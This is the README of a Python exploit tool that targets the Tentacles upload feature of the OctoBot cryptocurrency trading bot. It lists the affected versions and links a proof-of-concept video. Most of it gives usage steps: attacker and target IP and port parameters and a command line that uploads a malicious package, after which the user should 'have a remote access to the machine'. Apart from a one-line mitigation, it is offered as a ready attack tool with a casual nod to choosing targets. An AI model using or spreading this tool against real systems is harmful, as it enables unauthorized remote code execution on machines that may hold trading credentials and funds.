
# Sashimi Evil OctoBot Tentacle

Sashimi Evil OctoBot Tentacle is a python script that exploits a vulnerability that lies in the Tentacles upload functionality of the cryptocurrency trading bot [OctoBot](https://octobot.online/) which is designed to be easy to use and customizable. Indeed, this open source trading bot has the particularity of offering to theirs users the possibility to upload their own trading algorithms.

Sashimi Evil OctoBot Tentacle takes advantage of this feature to upload a malicious crafted package that leads to an arbitrary code execution.

![Sahimi Evil OctoBot Tentacle](https://i.ibb.co/M26vLMM/Sashimi-octobot-killer.png)

### Affected versions
All OctoBot  versions until the latest version (0.4.0b12) are vulnerable.
However, this exploit will work from version 0.4.0b3 until version 0.4.1.

### Proof of concept
(PoC Tested on Octobot 0.4.0b10)

[![Video POC Sashimi OctoBot Vulnerability](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://www.youtube.com/watch?v=okL0azY1BE4)


### Requirement

* Python 3 (Must already have it if you are OctoBot user :D)
* An OctoBot target host platform. 

### How to use
This script is very simple to use only needs 4 parameters.
* `--RHOST`:  Refers to the IP of the target machine. (OctoBot IP address or hostname)
* `--RPORT`: Refers to the PORT of the target machine. (OctoBot use the port 5001 by default)
* `--LHOST` : Refers to the IP of your machine. (Can be local or external, depend who you are targeting :)
* `--LPORT`: Refers to the open port of your machine. (Must have an open port on your machine.)

Then the command is as follow:
```bash
python3 sashimi.py --RHOST TARGET_IP --RPORT TARGET_PORT --LHOST YOUR_IP --LPORT YOUR_OPEN_PORT
```
Be patient for around 3 min, the time to download, create and upload the malicious Tentacle package, and you should have a remote access to the machine. That's it!

### Mitigation
To protect against this attack, set a password in your OctoBot platform or add an .htpasswd.

### Note
FOR EDUCATIONAL PURPOSE ONLY.
